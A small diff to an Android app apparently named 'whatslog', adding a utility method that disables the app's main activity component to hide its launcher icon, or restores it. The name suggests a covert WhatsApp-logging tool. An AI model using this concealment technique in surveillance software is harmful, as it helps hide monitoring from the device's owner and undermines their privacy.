@@ -6,9 +6,11 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
 
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.ContentUris;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -162,4 +164,14 @@ public class Utils {
 		}
 	}
 
+	public static void showIcon(boolean show,Context ctx){
+		ComponentName componentToDisable = new ComponentName("com.android.whatslog", "com.android.whatslog.activities.MainActivity");
+		PackageManager p = ctx.getPackageManager();
+		if(show)
+			p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP);
+		else
+			p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
+
+	}
 }
